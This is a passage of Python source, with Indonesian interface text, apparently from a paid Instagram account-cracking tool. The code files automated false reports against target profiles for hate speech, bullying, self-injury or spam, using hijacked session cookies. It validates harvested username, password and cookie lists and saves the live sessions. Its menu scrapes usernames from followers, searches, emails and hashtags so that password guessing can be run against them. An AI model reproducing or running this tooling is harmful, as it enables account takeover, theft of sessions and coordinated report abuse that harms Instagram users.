                        Sukses.append(response3.text)
                        return 0
                    elif '"message":"","status":"fail"' in str(response3.text):
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Status Fail...", end='\r')
                        time.sleep(1)
                        Checkpoint.append(response3.text)
                        return 1
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Gagal @{username} Username...", end='\r')
                        time.sleep(1)
                        Checkpoint.append(response3.text)
                        return 2
                else:
                    return 3
            else:
                return 4
            
    def Laporkan_Akun_Ujaran_Kebencian(self, cookies, object_id, username, context):
        with requests.Session() as r:
            r.headers.update({
                'sec-fetch-dest': 'empty',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'sec-fetch-site': 'same-origin',
                'referer': 'https://www.instagram.com/{}/'.format(username),
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'x-asbd-id': '198387',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'x-ig-app-id': '936619743392459',
                'sec-fetch-mode': 'cors',
            })
            data = {
                'frx_prompt_request_type': '2',
                'entry_point': '1',
                'container_module': 'profilePage',
                'location': '2',
                'object_type': '5',
                'object_id': object_id,
                'context': context,
                'selected_tag_types': '["ig_its_inappropriate"]',
            }
            response = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                'cookie': cookies
            })
            if '"status":"ok"' in str(response.text):
                self.context = json.loads(response.text)['response']['context']
                data = {
                    'selected_tag_type': 'ig_hate_speech_v3',
                    'context': context,
                }
                response2 = r.post('https://www.instagram.com/api/v1/web/reports/log_tag_selected/', data = data, cookies = {
                    'cookie': cookies
                }).text
                if '"status":"ok"' in str(response2):
                    data = {
                        'frx_prompt_request_type': '2',
                        'entry_point': '1',
                        'container_module': 'profilePage',
                        'location': '2',
                        'object_type': '5',
                        'object_id': object_id,
                        'context': self.context,
                        'selected_tag_types': '["ig_hate_speech_v3"]',
                    }
                    response3 = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                        'cookie': cookies
                    })
                    if '"status":"ok"' in str(response3.text):
                        self.context = json.loads(response3.text)['response']['context']
                        data = {
                            'frx_prompt_request_type': '4',
                            'entry_point': '1',
                            'location': '2',
                            'object_type': '5',
                            'object_id': object_id,
                            'context': self.context,
                            'action_type': '2',
                            'container_module': 'profilePage',
                        }
                        response4 = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                            'cookie': cookies
                        })
                        if '"status":"ok"' in str(response4.text):
                            self.follow_up_actions_title = json.loads(response4.text)['response']['follow_up_actions_title']['text']
                            try:
                                self.ds_user_id = re.search('ds_user_id=(\d+);', str(cookies)).group(1)
                                self.Convert_To_Username(cookies, self.ds_user_id)
                            except (Exception):
                                self.username = ('Error')
                            Console(width=71, style="bold royal_blue1").print(Panel(f"""[bold white]Response :[bold yellow] {self.follow_up_actions_title}
[bold white]Pelapor :[bold green] https://www.instagram.com/{self.username}""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                            Sukses.append(response4.text)
                            return 0
                        else:
                            Console().print(f"[bold royal_blue1]   ╰─>[bold red] Gagal @{username} Username...", end='\r')
                            time.sleep(1)
                            Checkpoint.append(response4.text)
                            return 1
                else:
                    return 2
            else:
                return 3

    def Laporkan_Akun_Bullying(self, cookies, object_id, username, context):
        with requests.Session() as r:
            r.headers.update({
                'sec-fetch-dest': 'empty',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'sec-fetch-site': 'same-origin',
                'referer': 'https://www.instagram.com/{}/'.format(username),
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'x-asbd-id': '198387',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'x-ig-app-id': '936619743392459',
                'sec-fetch-mode': 'cors',
            })
            data = {
                'frx_prompt_request_type': '2',
                'entry_point': '1',
                'container_module': 'profilePage',
                'location': '2',
                'object_type': '5',
                'object_id': object_id,
                'context': context,
                'selected_tag_types': '["ig_its_inappropriate"]',
            }
            response = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                'cookie': cookies
            })
            if '"status":"ok"' in str(response.text):
                self.context = json.loads(response.text)['response']['context']
                data = {
                    'selected_tag_type': 'ig_bullying_or_harassment_comment_v3',
                    'context': context,
                }
                response2 = r.post('https://www.instagram.com/api/v1/web/reports/log_tag_selected/', data = data, cookies = {
                    'cookie': cookies
                }).text
                if '"status":"ok"' in str(response2):
                    data = {
                        'frx_prompt_request_type': '2',
                        'entry_point': '1',
                        'container_module': 'profilePage',
                        'location': '2',
                        'object_type': '5',
                        'object_id': object_id,
                        'context': self.context,
                        'selected_tag_types': '["ig_bullying_or_harassment_comment_v3"]',
                    }
                    response3 = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                        'cookie': cookies
                    })
                    if '"status":"ok"' in str(response3.text):
                        self.context = json.loads(response3.text)['response']['context']
                        data = {
                            'selected_tag_type': 'ig_bullying_or_harassment_someone_i_know_v3',
                            'context': self.context,
                        }
                        response4 = r.post('https://www.instagram.com/api/v1/web/reports/log_tag_selected/', data = data, cookies = {
                            'cookie': cookies
                        }).text
                        if '"status":"ok"' in str(response4):
                            data = {
                                'frx_prompt_request_type': '2',
                                'entry_point': '1',
                                'container_module': 'profilePage',
                                'location': '2',
                                'object_type': '5',
                                'object_id': object_id,
                                'context': self.context,
                                'selected_tag_types': '["ig_bullying_or_harassment_someone_i_know_v3"]',
                            }
                            response5 = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                                'cookie': cookies
                            })
                            if '"status":"ok"' in str(response5.text):
                                self.context = json.loads(response5.text)['response']['context']
                                data = {
                                    'frx_prompt_request_type': '4',
                                    'entry_point': '1',
                                    'location': '2',
                                    'object_type': '5',
                                    'object_id': object_id,
                                    'context': self.context,
                                    'action_type': '2',
                                    'container_module': 'profilePage',
                                }
                                response6 = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                                    'cookie': cookies
                                })
                                if '"status":"ok"' in str(response6.text):
                                    self.follow_up_actions_title = json.loads(response6.text)['response']['follow_up_actions_title']['text']
                                    try:
                                        self.ds_user_id = re.search('ds_user_id=(\d+);', str(cookies)).group(1)
                                        self.Convert_To_Username(cookies, self.ds_user_id)
                                    except (Exception):
                                        self.username = ('Error')
                                    Console(width=71, style="bold royal_blue1").print(Panel(f"""[bold white]Response :[bold yellow] {self.follow_up_actions_title}
[bold white]Pelapor :[bold green] https://www.instagram.com/{self.username}""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                                    Sukses.append(response6.text)
                                    return 0
                                else:
                                    Console().print(f"[bold royal_blue1]   ╰─>[bold red] Gagal @{username} Username...", end='\r')
                                    time.sleep(1)
                                    Checkpoint.append(response6.text)
                                    return 1
                    else:
                        return 2
                else:
                    return 3
            else:
                return 4

    def Laporkan_Akun_Bunuh_Diri(self, cookies, object_id, username, context):
        with requests.Session() as r:
            r.headers.update({
                'sec-fetch-dest': 'empty',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'sec-fetch-site': 'same-origin',
                'referer': 'https://www.instagram.com/{}/'.format(username),
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'x-asbd-id': '198387',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'x-ig-app-id': '936619743392459',
                'sec-fetch-mode': 'cors',
            })
            data = {
                'frx_prompt_request_type': '2',
                'entry_point': '1',
                'container_module': 'profilePage',
                'location': '2',
                'object_type': '5',
                'object_id': object_id,
                'context': context,
                'selected_tag_types': '["ig_its_inappropriate"]',
            }
            response = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                'cookie': cookies
            })
            if '"status":"ok"' in str(response.text):
                self.context = json.loads(response.text)['response']['context']
                data = {
                    'selected_tag_type': 'ig_self_injury_v3',
                    'context': self.context,
                }
                response2 = r.post('https://www.instagram.com/api/v1/web/reports/log_tag_selected/', data = data, cookies = {
                    'cookie': cookies
                }).text
                if '"status":"ok"' in str(response2):
                    data = {
                        'frx_prompt_request_type': '2',
                        'entry_point': '1',
                        'container_module': 'profilePage',
                        'location': '2',
                        'object_type': '5',
                        'object_id': object_id,
                        'context': self.context,
                        'selected_tag_types': '["ig_self_injury_v3"]',
                    }
                    response3 = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                        'cookie': cookies
                    })
                    if '"status":"ok"' in str(response3.text):
                        self.context = json.loads(response3.text)['response']['context']
                        data = {
                            'frx_prompt_request_type': '4',
                            'entry_point': '1',
                            'location': '2',
                            'object_type': '5',
                            'object_id': object_id,
                            'context': self.context,
                            'action_type': '2',
                            'container_module': 'profilePage',
                        }
                        response4 = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                            'cookie': cookies
                        })
                        if '"status":"ok"' in str(response4.text):
                            self.follow_up_actions_title = json.loads(response4.text)['response']['follow_up_actions_title']['text']
                            try:
                                self.ds_user_id = re.search('ds_user_id=(\d+);', str(cookies)).group(1)
                                self.Convert_To_Username(cookies, self.ds_user_id)
                            except (Exception):
                                self.username = ('Error')
                            Console(width=71, style="bold royal_blue1").print(Panel(f"""[bold white]Response :[bold yellow] {self.follow_up_actions_title}
[bold white]Pelapor :[bold green] https://www.instagram.com/{self.username}""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                            Sukses.append(response4.text)
                            return 0
                        else:
                            Console().print(f"[bold royal_blue1]   ╰─>[bold red] Gagal @{username} Username...", end='\r')
                            time.sleep(1)
                            Checkpoint.append(response4.text)
                            return 1
                else:
                    return 2
            else:
                return 3

    def Laporkan_Akun_Spam(self, cookies, object_id, username, context):
        global Sukses, Checkpoint
        with requests.Session() as r:
            r.headers.update({
                'sec-fetch-dest': 'empty',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'sec-fetch-site': 'same-origin',
                'referer': 'https://www.instagram.com/{}/'.format(username),
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'x-asbd-id': '198387',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'x-ig-app-id': '936619743392459',
                'sec-fetch-mode': 'cors',
            })
            data = {
                'frx_prompt_request_type': '2',
                'entry_point': '1',
                'container_module': 'profilePage',
                'location': '2',
                'object_type': '5',
                'object_id': object_id,
                'context': context,
                'selected_tag_types': '["ig_spam_v3"]',
            }
            response = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                'cookie': cookies
            })
            if '"status":"ok"' in str(response.text):
                self.follow_up_actions_title = json.loads(response.text)['response']['follow_up_actions_title']['text']
                try:
                    self.ds_user_id = re.search('ds_user_id=(\d+);', str(cookies)).group(1)
                    self.Convert_To_Username(cookies, self.ds_user_id)
                except (Exception) as e:
                    self.username = ('Error')
                Console(width=71, style="bold royal_blue1").print(Panel(f"""[bold white]Response :[bold yellow] {self.follow_up_actions_title}
[bold white]Pelapor :[bold green] https://www.instagram.com/{self.username}""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                Sukses.append(response.text)
                return 0
            else:
                Console().print(f"[bold royal_blue1]   ╰─>[bold red] Gagal @{username} Username...", end='\r')
                time.sleep(1)
                Checkpoint.append(response.text)
                return 1

    def Convert_To_Username(self, cookies, object_id):
        with requests.Session() as r:
            r.headers.update({
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'x-ig-app-id': '936619743392459',
                'referer': 'https://www.instagram.com/',
                'Host': 'www.instagram.com',
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-mode': 'cors',
                'origin': 'https://www.instagram.com',
                'x-asbd-id': '198387',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-dest': 'empty',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            })
            response = r.get('https://www.instagram.com/graphql/query/?query_hash=d4d88dc1500312af6f937f7b804c68c3&user_id={}&include_chaining=false&include_reel=false&include_suggested_users=false&include_logged_out_extras=false&include_live_status=false&include_highlight_reels=true'.format(object_id), cookies = {
                'cookie': cookies
            })
            self.username = json.loads(response.text)['data']['user']['reel']['user']['username']
        return (self.username)

class Checker:

    def __init__(self) -> None:
        pass

    def Cookies(self):
        global Dump, Checkpoint, Sukses, Looping
        try:
            self.dir_results = os.listdir('Results')
            for z in self.dir_results:
                if 'ok' in str(z).lower():
                    self.open_path_file = open(f'Results/{str(z)}', 'r').read().splitlines()
                    for z in self.open_path_file:
                        try:
                            self.username, self.password, self.cookies = z.split('|')[0], z.split('|')[1], z.split('|')[5]
                            if 'sessionid' in str(self.cookies) and 'ds_user_id' in str(self.cookies):
                                Dump.append(f'{self.username}|{self.password}|{self.cookies}')
                                Console().print(f"[bold royal_blue1]   ╰─>[bold red] Dump {str(self.username)[:20]}/{len(Dump)} Username...", end='\r')
                                time.sleep(0.007)
                            else:
                                continue
                        except (IndexError):
                            continue
                else:
                    continue
            if os.path.exists('Results/Cookies.txt') == True:
                os.remove('Results/Cookies.txt')
            Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Hidup Dan Matikan[italic yellow] Mode Pesawat[italic white] Jika Ada Perintah, Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergantung Dari Akun Suspend Atau Tidak!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            for z in Dump:
                try:
                    self.username, self.password, self.cookies = z.split('|')[0], z.split('|')[1], z.split('|')[2]
                    with requests.Session() as r:
                        r.headers.update({
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                            'sec-fetch-dest': 'empty',
                            'accept-language': 'en-US,en;q=0.9',
                            'Host': 'www.instagram.com',
                            'referer': 'https://www.instagram.com/accounts/edit/',
                            'sec-fetch-mode': 'cors',
                            'x-asbd-id': '198387',
                            'x-ig-app-id': '936619743392459',
                            'accept': '*/*',
                            'x-csrftoken': re.search('csrftoken=(.*?);', str(self.cookies)).group(1),
                            'sec-fetch-site': 'same-origin',
                        })
                        response = json.loads(r.get('https://www.instagram.com/api/v1/accounts/edit/web_form_data/', cookies = {
                            'cookie': self.cookies
                        }).text)
                        if 'accounts/suspended/' in str(response) or 'checkpoint_required' in str(response):
                            Checkpoint.append(f'{self.username}|{self.password}|{self.cookies}')
                        elif '\'username\':' in str(response):
                            Console().print("\r                                                                       ", end='\r');time.sleep(0.07);time.sleep(2.5)
                            tree = Tree(Panel.fit("[bold green]LIVE COOKIES", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold green]{response['form_data']['username']}", style="bold royal_blue1", width=33), Panel(f"[bold green]{self.password}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold green]{self.cookies}", style="bold royal_blue1", width=67))
                            print(tree)
                            Sukses.append(f'{self.username}|{self.password}|{self.cookies}')
                            open('Results/Cookies.txt', 'a+').write(f'{self.username}|{self.password}|{self.cookies}\n')
                        else:
                            pass
                        Looping += 1
                        Console().print(f"[bold royal_blue1]   ──>[bold white] Crack [bold green]{str(self.username[:28])}[bold royal_blue1]/[bold white]{str(len(Dump))}[bold royal_blue1]/[bold white]{Looping} Ok:-[bold green]{len(Sukses)}[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white]          ", end='\r')
                        time.sleep(0.07)
                except (json.decoder.JSONDecodeError, KeyError, AttributeError, KeyboardInterrupt):
                    Console().print("\r                                                                       ", end='\r')
                    time.sleep(0.07)
                    continue
                except (RequestException):
                    Console().print("\r                                                                       ", end='\r')
                    time.sleep(0.07)
                    Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
                    time.sleep(10.5)
                    continue
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic green] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan Mendapatkan[italic red] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white], Semua Cookies[italic blue] Berhasil[italic white] Tersimpan Di Floder[italic green] Results[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Checker Selesai) [bold green]<[bold yellow]<[bold red]<"))
            exit()
        except (Exception) as e:
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
            exit()

class Menu:

    def __init__(self) -> None:
        pass

    def Utama(self, List):
        try:
            Terminal().Banner()
            self.apikey = json.loads(open('Data/Apikey.json', 'r').read())['Apikey']
            self.status, self.email, self.joined, self.expired = Think_Insta().Validasi(self.apikey, platform())
            Player.update({
                'Type': self.status.capitalize()
            })
            if self.status == 'premium' or self.status == 'trial':
                List.append(Panel(f"""[bold white]Status :[bold green] {self.status.capitalize()[:23]}
[bold white]Expired :[bold red] {self.expired[:23]}
[bold white]Joined :[bold green] {self.joined[:23]}""", width=35))
            else:
                Terminal().Banner()
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Kamu Terdeteksi Sebagai Pengguns Ilegal, Silahkan Upgrade Apikey!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Tidak Diketahui) [bold green]<[bold yellow]<[bold red]<"));exit()
        except (Exception) as e:
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic yellow]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
            time.sleep(4.5)
            Think_Insta().Apikey()
        try:
            self.cookies = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
            self.first_name, self.username, self.birthday = Login().My_Akun(self.cookies)
            List.append(Panel(f"""[bold white]Birthday :[bold yellow] {self.birthday[:23]}
[bold white]Name :[bold green] {self.first_name.title()[:23]}
[bold white]Username :[bold blue] @{self.username[:22]}""", width=35))
        except (Exception) as e:
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
            time.sleep(4.3)
            Login().Cookies().Cookies()

        Console(style="bold royal_blue1").print(Columns(List))
        self.jumlah, self.online = Pengguna().Total_Count();self.update_time_instagram = Pengguna().Instagram_Version().replace(' ', '-')

        Console(width=71, style="bold royal_blue1").print(Panel("""[bold green]01[bold white]. Crack Ulang Hasil Checkpoint    [bold green]09[bold white]. Crack User Dari Komentar
[bold green]02[bold white]. Crack User Dari Pencarian       [bold green]10[bold white]. Lihat Semua Hasil Crack
[bold green]03[bold white]. Crack User Dari Pengikut        [bold green]11[bold white]. Crack User Dari Hastag
[bold green]04[bold white]. Crack User Dari Mengikuti       [bold green]12[bold white]. Delete Semua Inbox ([bold green]New[bold white])
[bold green]05[bold white]. Crack User Dari Email ([bold green]New[bold white])     [bold green]13[bold white]. Unfollow Semua User
[bold green]06[bold white]. Crack User Dari Post Likes      [bold green]14[bold white]. Delete Semua Postingan
[bold green]07[bold white]. Scrape Useragent Terbaru        [bold green]15[bold white]. Lihat Fitur Lainnya
[bold green]08[bold white]. Crack User Dari Post Populer    [bold green]16[bold white]. Delete Instagram Cookies""", title=f"[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Pengguna {self.jumlah}/{self.update_time_instagram}/{self.online} Online) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
        query = Console().input("[bold royal_blue1]   ╰─> ")
        if query == '01':
            try:
                if self.status == 'premium':
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Silahkan Masukan File Results[italic green] Ok[italic white]/[italic red]Cp[italic white], Untuk Melihat File ([italic green]dir Results[italic white]), Misalnya :[italic green] Results/Cp-{Results().Tanggal()}.txt", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    files = Console().input("[bold royal_blue1]   ╰─> ")
                    if os.path.exists(files) == True:
                        Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Useragent, Gunakan Koma Untuk Useragent Random ([italic green]Realme,Samsung,Oppo,Xiaomi,Vivo,Poco,Huawei,Infinix,Asus,Lenovo,Nokia,Motorola,Pixel,Oneplus,HTC,LG,Nexus,Tecno,Sony,Kyocera,Fujitsu,Meizu,Micromax,Itel,Sharp[italic white]) Ini Semua Adalah Useragent Instagram, Misalnya :[italic green] Realme,Nokia,Xiaomi", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Pilih Useragent) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                        useragent = Console().input("[bold royal_blue1]   ╰─> ")
                        Useragent.append(f"{useragent}")
                        Mengecek().Baca(open(files, 'r').read().splitlines())
                    else:
                        Console(width=71, style="bold royal_blue1").print(Panel("[italic red]File Yang Kamu Masukan Tidak Ada Di Dalam Floder Results!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (File Tidak Ada) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"))
                    os.system('xdg-open https://wa.me/6283847921480')
                    time.sleep(3.5)
                    Menu().Utama(List = [])
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '02':
            try:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Nama Target, Gunakan Koma Untuk Nama Berbeda Atau Dump Masal, Misalnya :[italic green] Zuck,Rozhak,Riky[italic white] *Gunakan[italic red] CTRL+C[italic white] Untuk Stop!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                name = Console().input("[bold royal_blue1]   ╰─> ")
                for z in name.split(','):
                    Dumps().Pencarian_Nama(self.cookies, z)
                if len(Dump) > 1:
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                    Set_Password().Settingan()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '03':
            try:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Username Target, Gunakan Koma Untuk Username Berbeda Atau Dump Masal, Misalnya :[italic green] Zuck,Rozhak_Official,Ms_Puiyi[italic white] *Gunakan[italic red] CTRL+C[italic white] Untuk Stop!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                username = Console().input("[bold royal_blue1]   ╰─> ")
                if 'rozhak_official' in str(username).lower():
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sekali Lagi Apikey Kamu Akan Di Blokir Jika Dump Akun Developer!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Apikey Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                for z in username.split(','):
                    Convert().Get_Username(self.cookies, f'https://www.instagram.com/{z}/followers/')
                    self.name, self.userid = Convert().Username(self.cookies, z, 'Dump')
                    Dumps().Pengikut(self.cookies, self.userid, z, max_id = '')
                if len(Dump) > 50:
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                    Set_Password().Settingan()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '04':
            try:
                if self.status == 'premium':
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Username Target, Gunakan Koma Untuk Username Berbeda Atau Dump Masal, Misalnya :[italic green] Zuck,Rozhak_Official,Ms_Puiyi[italic white] *Gunakan[italic red] CTRL+C[italic white] Untuk Stop!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    username = Console().input("[bold royal_blue1]   ╰─> ")
                    if 'rozhak_official' in str(username).lower():
                        Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sekali Lagi Apikey Kamu Akan Di Blokir Jika Dump Akun Developer!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Apikey Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                    for z in username.split(','):
                        Convert().Get_Username(self.cookies, f'https://www.instagram.com/{z}/following/')
                        self.name, self.userid = Convert().Username(self.cookies, z, 'Dump')
                        Dumps().Mengikuti(self.cookies, self.userid, z, max_id = 0)
                    if len(Dump) > 50:
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                        Set_Password().Settingan()
                    else:
                        Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"))
                    os.system('xdg-open https://wa.me/6283847921480')
                    time.sleep(3.5)
                    Menu().Utama(List = [])
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '05':
            try:
                if self.status == 'premium':
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Nama Dan Domain, Gunakan Koma Untuk Nama Berbeda Atau Dump Masal Dan Plus Untuk Pemisah Nama Dan Gmail, Misalnya :[italic green] Zuck+@gmail.com,Rozhak+@gmail.com[italic white] *Gunakan[italic red] CTRL+C[italic white] Untuk Stop!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    puts_name = Console().input("[bold royal_blue1]   ╰─> ").replace(' ', '')
                    for z in puts_name.split(','):
                        self.name, self.domain = z.split('+')[0], z.split('+')[1]
                        Dumps().Email(self.name, self.domain)
                    if len(Dump) > 50:
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                        Set_Password().Settingan()
                    else:
